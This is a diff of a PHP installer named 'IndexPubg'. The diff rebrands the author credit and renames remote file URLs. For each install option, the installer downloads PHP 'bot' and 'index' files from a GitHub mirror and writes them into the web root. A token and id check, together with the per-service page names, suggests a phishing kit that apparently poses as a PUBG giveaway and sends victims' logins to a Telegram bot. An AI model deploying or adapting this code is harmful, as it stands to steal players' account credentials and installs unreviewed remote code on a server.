@@ -28,7 +28,7 @@ if((!$token or !$id)and $install){
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-<title>Install IndexPubg - By @Sha_My</title>
+<title>Install IndexPubg - By @PPABB</title>
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
@@ -60,14 +60,14 @@ if($install){
 	
 	 if($install=="H"){
 
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/hbot.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/h-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy);
 
 $index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/hindex.php');
 $xx = file_put_contents("index.php", $index);
 }
  if($install=="P"){
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/pbot.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/p-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy); 
 
 $index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/pindex.php');
@@ -75,7 +75,7 @@ $xx = file_put_contents("index.php", $index);
 }
 	
 	 if($install=="F"){
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/fbot.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/f-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy); 
 
 $index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/findex.php');
@@ -83,7 +83,7 @@ $xx = file_put_contents("index.php", $index);
 }
 
 	 if($install=="M"){
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/mbot.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/m-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy);
 
 $index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/mindex.php');
@@ -95,7 +95,7 @@ $homee = file_put_contents("home.php", $home);
 }
 if($install=="MT"){
 	
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/index-pubg/main/MT/b-bot.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/mt-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy);
 
 $index = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/MT/index.php');
@@ -103,7 +103,7 @@ $xx = file_put_contents("index.php", $index);
 }
 if($install=="S"){
 	
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/sbot.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/s-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy);
 
 $index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/sidex.php');
@@ -120,7 +120,7 @@ if(!$install){
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 <meta http-equiv="refresh" content="1">
-<title>Pubg - By @Sha_My</title>
+<title>Pubg - By @PPABB</title>
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
@@ -201,7 +201,7 @@ if(!$install){
 
 <center>
     <br><hr><br>
-   <h5><a href="https://t.me/Sha_My"> Developed by @Sha_My 👻 </a></h5>
+   <h5><a href="https://t.me/PPABB"> Developed by @PPABB 👻 </a></h5>
    </center>
 </body>
 </html>
